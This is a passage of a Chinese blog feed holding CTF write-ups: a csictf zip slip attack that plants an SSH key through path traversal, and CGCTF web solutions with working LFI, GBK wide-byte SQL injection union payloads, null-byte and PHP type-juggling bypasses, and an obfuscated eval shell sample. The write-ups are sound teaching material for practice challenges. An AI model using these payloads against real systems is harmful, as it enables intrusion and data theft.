&#x2F;etc&#x2F;ssh&#x2F;ssh_host_ecdsa_key</span><br><span class="line">#HostKey &#x2F;etc&#x2F;ssh&#x2F;ssh_host_ed25519_key</span><br><span class="line"></span><br><span class="line"># Ciphers and keying</span><br><span class="line">#RekeyLimit default none</span><br><span class="line"></span><br><span class="line"># Logging</span><br><span class="line">#SyslogFacility AUTH</span><br><span class="line">#LogLevel INFO</span><br><span class="line"></span><br><span class="line"># Authentication:</span><br><span class="line"></span><br><span class="line">#LoginGraceTime 2m</span><br><span class="line">#PermitRootLogin prohibit-password</span><br><span class="line">#StrictModes yes</span><br><span class="line">#MaxAuthTries 6</span><br><span class="line">#MaxSessions 10</span><br><span class="line"></span><br><span class="line">#PubkeyAuthentication yes</span><br><span class="line"></span><br><span class="line"># Expect .ssh&#x2F;authorized_keys2 to be disregarded by default in future.</span><br><span class="line">#AuthorizedKeysFile\t.ssh&#x2F;authorized_keys .ssh&#x2F;authorized_keys2</span><br><span class="line"></span><br><span class="line">#AuthorizedPrincipalsFile none</span><br><span class="line"># csictf&#123;cu5t0m_4uth0rizat10n&#125;</span><br><span class="line">AuthorizedKeysCommand &#x2F;usr&#x2F;local&#x2F;bin&#x2F;userkeys.sh</span><br><span class="line">AuthorizedKeysCommandUser nobody</span><br><span class="line"></span><br><span class="line"># For this to work you will also need host keys in &#x2F;etc&#x2F;ssh&#x2F;ssh_known_hosts</span><br><span class="line">#HostbasedAuthentication no</span><br><span class="line"># Change to yes if you don&#39;t trust ~&#x2F;.ssh&#x2F;known_hosts for</span><br><span class="line"># HostbasedAuthentication</span><br><span class="line">#IgnoreUserKnownHosts no</span><br><span class="line"># Don&#39;t read the user&#39;s ~&#x2F;.rhosts and ~&#x2F;.shosts files</span><br><span class="line">#IgnoreRhosts yes</span><br><span class="line"></span><br><span class="line"># To disable tunneled clear text passwords, change to no here!</span><br><span class="line">PasswordAuthentication no</span><br><span class="line">#PermitEmptyPasswords no</span><br><span class="line"></span><br><span class="line"># Change to yes to enable challenge-response passwords (beware issues with</span><br><span class="line"># some PAM modules and threads)</span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line"></span><br><span class="line"># Kerberos options</span><br><span class="line">#KerberosAuthentication no</span><br><span class="line">#KerberosOrLocalPasswd yes</span><br><span class="line">#KerberosTicketCleanup yes</span><br><span class="line">#KerberosGetAFSToken no</span><br><span class="line"></span><br><span class="line"># GSSAPI options</span><br><span class="line">#GSSAPIAuthentication no</span><br><span class="line">#GSSAPICleanupCredentials yes</span><br><span class="line">#GSSAPIStrictAcceptorCheck yes</span><br><span class="line">#GSSAPIKeyExchange no</span><br><span class="line"></span><br><span class="line"># Set this to &#39;yes&#39; to enable PAM authentication, account processing,</span><br><span class="line"># and session processing. If this is enabled, PAM authentication will</span><br><span class="line"># be allowed through the ChallengeResponseAuthentication and</span><br><span class="line"># PasswordAuthentication. Depending on your PAM configuration,</span><br><span class="line"># PAM authentication via ChallengeResponseAuthentication may bypass</span><br><span class="line"># the setting of \&quot;PermitRootLogin without-password\&quot;.</span><br><span class="line"># If you just want the PAM account and session checks to run without</span><br><span class="line"># PAM authentication, then enable this but set PasswordAuthentication</span><br><span class="line"># and ChallengeResponseAuthentication to &#39;no&#39;.</span><br><span class="line">UsePAM yes</span><br><span class="line"></span><br><span class="line">#AllowAgentForwarding yes</span><br><span class="line">#AllowTcpForwarding yes</span><br><span class="line">#GatewayPorts no</span><br><span class="line">X11Forwarding yes</span><br><span class="line">#X11DisplayOffset 10</span><br><span class="line">#X11UseLocalhost yes</span><br><span class="line">#PermitTTY yes</span><br><span class="line">PrintMotd no</span><br><span class="line">#PrintLastLog yes</span><br><span class="line">#TCPKeepAlive yes</span><br><span class="line">#PermitUserEnvironment no</span><br><span class="line">#Compression delayed</span><br><span class="line">#ClientAliveInterval 0</span><br><span class="line">#ClientAliveCountMax 3</span><br><span class="line">#UseDNS no</span><br><span class="line">#PidFile &#x2F;var&#x2F;run&#x2F;sshd.pid</span><br><span class="line">#MaxStartups 10:30:100</span><br><span class="line">#PermitTunnel no</span><br><span class="line">#ChrootDirectory none</span><br><span class="line">#VersionAddendum none</span><br><span class="line"></span><br><span class="line"># no default banner path</span><br><span class="line">#Banner none</span><br><span class="line"></span><br><span class="line"># Allow client to pass locale environment variables</span><br><span class="line">AcceptEnv LANG LC_*</span><br><span class="line"></span><br><span class="line"># override default of no subsystems</span><br><span class="line">Subsystem\tsftp\t&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;sftp-server</span><br><span class="line"></span><br><span class="line"># Example of overriding settings on a per-user basis</span><br><span class="line">#Match User anoncvs</span><br><span class="line">#\tX11Forwarding no</span><br><span class="line">#\tAllowTcpForwarding no</span><br><span class="line">#\tPermitTTY no</span><br><span class="line">#\tForceCommand cvs server&quot;</span><br></pre></td></tr></table></figure>
<p>其中包含了HTB 0x05的flag：<code>csictf&#123;cu5t0m_4uth0rizat10n&#125;</code></p>
<p>接着看<code>/usr/local/bin/userkeys.sh</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">if [ \&quot;$1\&quot; &#x3D;&#x3D; \&quot;csictf\&quot; ]; then</span><br><span class="line">        cat &#x2F;home&#x2F;administrator&#x2F;uploads&#x2F;keys&#x2F;*</span><br><span class="line">else</span><br><span class="line">        echo \&quot;\&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p>题目的意思应该要我们上传一个Public Key到<code>/home/administrator/uploads/keys/</code>，然后用ssh登录，能上传的地方就只有之前那个zip upload。看赛后的wp，这里用到的是zip slip漏洞：<a href="https://github.com/snyk/zip-slip-vulnerability">Zip Slip Vulnerability</a></p>
<p>先在本机上生成一个ssh public key，然后特殊的zip压缩文件，上传</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa     #filename:my_key</span><br><span class="line">$ 7z a zip-slip.zip my_key.pub</span><br><span class="line">$ 7z rn zip-slip.zip my_key.pub &#39;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;home&#x2F;administrator&#x2F;uploads&#x2F;keys&#x2F;dunsp4rce.pub&#39;</span><br></pre></td></tr></table></figure>
<p>返回<code>&#123;success: true&#125;</code></p>
<p>再ssh登录，在当前目录下得到HTB 0x03的flag</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728135732.png" alt=""></p>
<p>接着就是去<code>/home</code>目录下找各种文件了</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728135914.png" alt=""></p>
<p>在<code>/home/administrator/website/models/db.js</code>中发现HTB 0x06的flag。</p>
<p>并且还给出了mongodb登录的口令</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728140033.png" alt=""></p>
<p>拿到HTB 0x04的flag。</p>
<h2 id="Reference">Reference</h2>
<p><a href="https://dunsp4rce.github.io/csictf-2020/">https://dunsp4rce.github.io/csictf-2020/</a></p>
<p><a href="https://github.com/team0se7en/CTF-Writeups/tree/master/csictf2020/">https://github.com/team0se7en/CTF-Writeups/tree/master/csictf2020/</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-Writeup之CGCTF</title>
    <url>/Web_security/ctf_writeup/3.CGCTF-Writeup/</url>
    <content><![CDATA[<h1 id="CGCTF-Writeup-Web">CGCTF Writeup Web</h1>
<p>已经决定开始走上了CTF的不归路了，这是第一个练手的CTF，比较适合新手入门学习，有几道题也是看的网上的Writeup，总的来说不是很难吧，重在总结经验和绕过姿势。</p>
<p><a href="https://cgctf.nuptsast.com/challenges#Web">传送门</a></p>
<h3 id="Web">Web</h3>
<h4 id="签到题">签到题</h4>
<h5 id="题干">题干</h5>
<p>这一定是最简单的</p>
<h5 id="题解">题解</h5>
<p>直接F12查看源代码：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191113130246.png" alt=""></p>
<p>**flag：<code>nctf&#123;flag_admiaanaaaaaaaaaaa&#125;</code> **</p>
<h4 id="md5-collision">md5 collision</h4>
<h5 id="题干-v2">题干</h5>
<p>源码（PHP）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$md51 = md5(<span class="string">&#x27;QNKCDZO&#x27;</span>);</span><br><span class="line">$a = @$_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line"><span class="keyword">if</span> ($a != <span class="string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nctf&#123;*****************&#125;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;false!!!&quot;</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">&quot;please input a&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<h5 id="题解-v2">题解</h5>
<p>看源码的意思就是，让我们输入一个<code>id</code>，这个<code>id</code>的值不等于<code>QNKCDZO</code>，但是他们的md5码是相同的。</p>
<blockquote>
<p>===比较两个变量的值和类型；</p>
<p>==比较两个变量的值,不比较数据类型。</p>
</blockquote>
<p>首先看一下<code>QNKCDZO</code>的md5码是什么：<code>0e830400451993494058024219903391</code>。</p>
<blockquote>
<p>md5碰撞原理：一个数字和一个字符串进行比较，PHP会把字符串转换成数字再进行比较。PHP转换的规则的是：若字符串以数字开头，则取开头数字作为转换结果，若无则输出0。例如：123abc转换后应该是123，而abc则为0，0==0这当然是成立的。所以，0 ==’abc’是成立的。当有一个对比参数是整数的时候，会把另外一个参数强制转换为整数。</p>
</blockquote>
<p>所以，我们只要找到md5加密后以<code>0e</code>开头的字符串就可以绕过<code>==</code>的判断了，这里给大家列举了一写：<a href="https://blog.csdn.net/qq_38603541/article/details/97108663">常见的MD5碰撞：md5值为0e开头</a></p>
<blockquote>
<p>与之类似的还有sha1： aaroZmOk aaK1STfY aaO8zKZF aaO8zKZF aa3OFF9m，这几个字符串经过sha1加密后也是<code>0e</code>开头。</p>
</blockquote>
<p>**flag：<code>nctf&#123;md5_collision_is_easy&#125;</code> **</p>
<h4 id="签到2">签到2</h4>
<p>提示输入口令。</p>
<p>先把输入框的类型改为<code>text</code>，可以发现只能输入10个字符，即输入框对输入长度进行了限制。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191113180855.png" alt=""></p>
<p>修改一下最大长度，输入<code>zhimakaimen</code>即可。</p>
<p><strong>flag：<code>nctf&#123;follow_me_to_exploit&#125;</code></strong></p>
<h4 id="这题不是Web">这题不是Web</h4>
<p>网页中给了一张图片，并且提示这道题不是Web，可以联想到可能是图片隐写术。直接Download图片，用Notepad++打开。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191113181427.png" alt=""></p>
<p><strong>flag：<code>nctf&#123;photo can also hid3 msg&#125;</code></strong></p>
<h4 id="层层递进">层层递进</h4>
<p>使用F12查看源代码，根据题目提示“层层递进”，这道题使用<code>iframe</code>标签对页面进行嵌套，找到最后一个404.html页面，竟然提示我查看上一个页面。原谅我眼瞎，找了好久，发现隐藏在注释里面。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191113183453.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191113183754.png" alt=""></p>
<p><strong>flag：<code>nctf&#123;this_is_a_fl4g&#125;</code></strong></p>
<h4 id="AAencode">AAencode</h4>
<h5 id="题干-v3">题干</h5>
<p>javascript aaencode</p>
<h5 id="题解-v3">题解</h5>
<p>上网搜一下<code>javascript aaencode</code>，发现是一种颜文字：</p>
<ul>
<li>JJencode：将JS代码转换成只有符号的字符串</li>
<li>AAencode：将JS代码转换成常用的网络符号</li>
</ul>
<p>AAencode加密网址： <a href="http://utf-8.jp/public/aaencode.html">http://utf-8.jp/public/aaencode.html</a></p>
<p>解密方法：以直接利用浏览器的控制台输入密文，执行后即可解密。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191113184447.png" alt=""></p>
<h4 id="单身二十年">单身二十年</h4>
<h5 id="题干-v4">题干</h5>
<p>这题可以靠技术也可以靠手速！ 老夫单身二十年，自然靠的是手速！</p>
<h5 id="题解-v4">题解</h5>
<p>看到一个链接，查看源代码，该链接指向<code>./search_key.php</code></p>
<p>点击链接，我们却去到了<code>./no_key_is_here_forever.php</code>这个页面</p>
<p>猜测是302跳转。</p>
<p>使用Burp Suite抓包，查看Sitemap：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191113185357.png" alt=""></p>
<p>**flag：<code>nctf&#123;yougotit_script_now&#125;</code> **</p>
<h4 id="PHP-decode">PHP decode</h4>
<h5 id="题干-v5">题干</h5>
<p>见到的一个类似编码的shell，请解码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CLsI</span>(<span class="params">$ZzvSWE</span>) </span>&#123;</span><br><span class="line"> </span><br><span class="line">    $ZzvSWE = (base64_decode($ZzvSWE));</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($ZzvSWE); $i++) &#123;</span><br><span class="line"> </span><br><span class="line">        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - <span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> $ZzvSWE;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(CLsI(<span class="string">&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="题解-v5">题解</h5>
<p>这道题直接拿到本地运行这段代码flag不就出来了-_-</p>
<p><strong>flag:nctf{gzip_base64_hhhhhh}</strong></p>
<h4 id="文件包含">文件包含</h4>
<h5 id="题干-v6">题干</h5>
<p>没错 这就是传说中的LFI</p>
<h5 id="题解-v6">题解</h5>
<p>有关文件包含漏洞的利用我在另外一篇博文很详细的介绍了，可以<a href="http://ca0y1h.top/2019/11/15/Week13-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/">移步于此</a>。</p>
<p>查看index.php页面的源代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;4.chinalover.sinaapp.com&#x2F;web7&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>
<p>把结果经过base64解码后得到源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;asdf&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(!$_GET[file])&#123;<span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#x27;</span>;&#125;</span><br><span class="line">	$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(strstr($file,<span class="string">&quot;../&quot;</span>)||stristr($file, <span class="string">&quot;tp&quot;</span>)||stristr($file,<span class="string">&quot;input&quot;</span>)||stristr($file,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>就可以直接到<strong>flag:<code>nctf&#123;edulcni_elif_lacol_si_siht&#125;</code></strong></p>
<h4 id="单身一百年也没用">单身一百年也没用</h4>
<p>与第7题类似</p>
<p><strong>flag: <code>nctf&#123;this_is_302_redirect&#125;</code></strong></p>
<h4 id="Cookie">Cookie</h4>
<h5 id="题干-v7">题干</h5>
<p>COOKIE就是甜饼的意思~</p>
<p>TIP: 0==not</p>
<h5 id="题解-v7">题解</h5>
<p>F12查看request数据包中的cookie字段，发现<code>Login=0</code>。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191113211310.png" alt=""></p>
<p>用BurpSuit抓包修改<code>cookie</code>参数<code>Login=1</code>即可。</p>
<p><strong>flag:<code>nctf&#123;cookie_is_different_from_session&#125;</code></strong></p>
<h4 id="MySQL">MySQL</h4>
<h5 id="题干-v8">题干</h5>
<p>不能每一题都这么简单嘛 你说是不是？</p>
<p>页面提示<code>Do you know robots.txt？</code></p>
<p>于是访问<code>http://chinalover.sinaapp.com/web11/robots.txt</code></p>
<p>返回：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">别太开心，flag不在这，这个文件的用途你看完了？</span><br><span class="line">在CTF比赛中，这个文件往往存放着提示信息</span><br><span class="line"></span><br><span class="line">TIP:sql.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if($_GET[id]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $id &#x3D; intval($_GET[id]);</span><br><span class="line">  $query &#x3D; @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id&#x3D;&#39;$id&#39;&quot;));</span><br><span class="line">  if ($_GET[id]&#x3D;&#x3D;1024) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;no! try again&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else&#123;</span><br><span class="line">    echo($query[content]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>应该是让我们输入一个<code>id</code>，但他的值不等于<code>1024</code>，但是<code>intval</code>之后和<code>1024</code>相等，那么只要知道<code>intval()</code>函数取整，就很容易了。</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;web11&#x2F;sql.php?id&#x3D;1024.1</span><br></pre></td></tr></table></figure>
<p>得到<code>flag:nctf&#123;query_in_mysql&#125;</code></p>
<blockquote>
<p>我最先开始没有注意到还有一个提示：<code>TIP:sql.php</code>，导致我在其他路径浪费了很多时间。</p>
</blockquote>
<h4 id="GBK-Injection">GBK Injection</h4>
<p>根据题目很容易就能想到这是考察宽字节注入，先来稍微的介绍一下什么是宽字节注入。</p>
<p>宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入。例如说PHP的编码为 <code>UTF-8</code>而<code>MySql</code>的编码设置为了<br>
<code>SET NAMES 'gbk'</code>或是 <code>SET character_set_client =gbk</code>，这样配置会引发编码转换从而导致的注入漏洞。具体来说，假如某个网站有宽字节注入，那么我们提交：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;unicodeSqlTest?id&#x3D;%df%27</span><br></pre></td></tr></table></figure>
<p>这时,假如我们现在使用的是<code>addslashes</code>来过滤,那么就会发生如下的转换过程：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%df%27&#x3D;&#x3D;&#x3D;(addslashes)&#x3D;&#x3D;&#x3D;&gt;%df%5c%27&#x3D;&#x3D;&#x3D;(数据库GBK)&#x3D;&#x3D;&#x3D;&gt;運&#39;</span><br></pre></td></tr></table></figure>
<p>前端输入<code>%df%27</code>时首先经过上面<code>addslashes</code>函数转义变成了<code>%df%5c%27</code>（<code>%5c是反斜杠\</code>)，之后在数据库查询前因为设置了<code>GBK</code>编码，即是在汉字编码范围内两个字节都会给重新编码为一个汉字。然后MySQL服务器就会对查询语句进行GBK编码即是<code>%df%5c</code>转换成了汉字<code>運</code>，而单引号就逃逸了出来，从而造成了注入漏洞。</p>
<p>介绍完了宽字节注入的原理，我们再回到这道题目。</p>
<p>首先我们使用宽字节注入来进行绕过，当我们输入<code>%df'</code>，出现如下报错：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">your sql:select id,title from news where id &#x3D; &#39;1運&#39;&#39;</span><br><span class="line"></span><br><span class="line">Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in SQL-GBK&#x2F;index.php on line 10</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>发现出现了报错，说明我们的语句已经影响了正常语句的执行了，可以开始注入了。</p>
<p>首先使用<code>order by</code>判断列数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;1%df%27%20order%20by%202--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>发现只有两列，再查询当前数据库名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;-1%df&#39; union select 1,database()--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到<code>sae-chinalover</code>，接着查询该数据库中的表名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;-1%df&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到<code>ctf,ctf2,ctf3,ctf4,gbksqli,news</code>，再查询列名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;-1%df&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;0x63746634--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里需要把<code>ctf4</code>转换为十六进制</p>
</blockquote>
<p>得到<code>id, flag</code>，最后查询数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;-1%df&#39; union select 1,flag from ctf4--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到<strong>flag: <code>nctf&#123;gbk_3sqli&#125; </code></strong></p>
<h4 id="x00">/x00</h4>
<h5 id="题干-v9">题干</h5>
<p>题目有多种解法，你能想出来几种？</p>
<h5 id="题解-v8">题解</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">&#x27;nctf&#x27;</span>])) &#123;</span><br><span class="line">       <span class="keyword">if</span> (@ereg (<span class="string">&quot;^[1-9]+$&quot;</span>, $_GET[<span class="string">&#x27;nctf&#x27;</span>]) === <span class="literal">FALSE</span>)</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;必须输入数字才行&#x27;</span>;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">&#x27;nctf&#x27;</span>], <span class="string">&#x27;#biubiubiu&#x27;</span>) !== <span class="literal">FALSE</span>)   </span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.$flag);</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;骚年，继续努力吧啊~&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>根据上面的源码提示，要输入数字并且含有<code>#biubiubiu</code>字符串的nctf参数。</p>
<p>第一种解法：</p>
<p>使用<code>00截断</code>绕过<code>ereg</code>函数，但要注意将<code>#</code>url编码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;teamxlc.sinaapp.com&#x2F;web4&#x2F;f5a14f5e6e3453b78cd73899bad98d53&#x2F;index.php?nctf&#x3D;1%00%23biubiubiu</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>第二种解法：</p>
<p>第一个不等式中<code>ereg</code>函数，当传入参数为数组<code>nctf[]</code>时，<code>NULL != FALSE</code> ，构造成功跳过第一个不等式，第二个不等式中<code>strpos</code>函数传入参数数组之后 <code>NULL != FLASE</code>会返回flag。</p>
<p>**flag:<code>nctf&#123;use_00_to_jieduan&#125;</code> **</p>
<h4 id="Bypass-again">Bypass again</h4>
<h5 id="题干-v10">题干</h5>
<p>依旧是弱类型</p>
<p>来源 hctf</p>
<h5 id="题解-v9">题解</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">&#x27;a&#x27;</span>] != $_GET[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (md5($_GET[<span class="string">&#x27;a&#x27;</span>]) == md5($_GET[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>与第二道题md5 collision类似,，只需要找到两个字符串经过<code>md5</code>加密后，均以<code>0e</code>开头即可绕过验证。</p>
<p>Payload：<code>?a=QNKCDZO&amp;b=240610708</code></p>
<p><strong>Flag: <code>nctf&#123;php_is_so_cool&#125;</code></strong></p>
<h4 id="变量覆盖">变量覆盖</h4>
<h5 id="题干-v11">题干</h5>
<p>听说过变量覆盖么？</p>
<h5 id="题解-v10">题解</h5>
<p>有关变量覆盖的漏洞利用在我的另外一篇博文有详细介绍，可以<a href="http://ca0y1h.top/categories/websecurity/custom/">移步于此</a>。</p>
<p>直接查看source.php文件的关键代码段：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] &#x3D;&#x3D; &quot;POST&quot;) &#123; ?&gt;</span><br><span class="line">	&lt;?php</span><br><span class="line">		extract($_POST);</span><br><span class="line">         if ($pass &#x3D;&#x3D; $thepassword_123) &#123; ?&gt;</span><br><span class="line">			&lt;div class&#x3D;&quot;alert alert-success&quot;&gt;</span><br><span class="line">                &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;&#x2F;code&gt;</span><br><span class="line">             &lt;&#x2F;div&gt;</span><br><span class="line">         &lt;?php &#125; ?&gt;</span><br><span class="line">&lt;?php &#125; ?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>post数据：<code>pass=1&amp;thepassword_123=1</code></p>
<blockquote>
<p>注意：在页面的输入表单中输入payload无效</p>
</blockquote>
<h4 id="伪装者">伪装者</h4>
<h5 id="题干-v12">题干</h5>
<p>这是一个到处都有着伪装的世界</p>
<h5 id="题解-v11">题解</h5>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119092209.png" alt=""></p>
<p>提示我们要本地登录，应该就是要我们用一个伪造本地IP地址访问该页面。BurpSuite导入第三方Python脚本可以</p>
<p>实现伪造IP的功能。</p>
<blockquote>
<p>附上Python脚本地址：<a href="https://github.com/TheKingOfDuck/burpFakeIP">burpFakeIP</a></p>
</blockquote>
<h4 id="上传绕过">上传绕过</h4>
<h5 id="题干-v13">题干</h5>
<p>猜猜代码怎么写的</p>
<h5 id="题解-v12">题解</h5>
<p>既然要猜代码逻辑，那就先一步一步的尝试咯~</p>
<p>如果不上传任何文件，直接submit：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119093359.png" alt=""></p>
<p>如果上传php格式文件：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119093937.png" alt=""></p>
<p>如果上传jpg格式文件：</p>
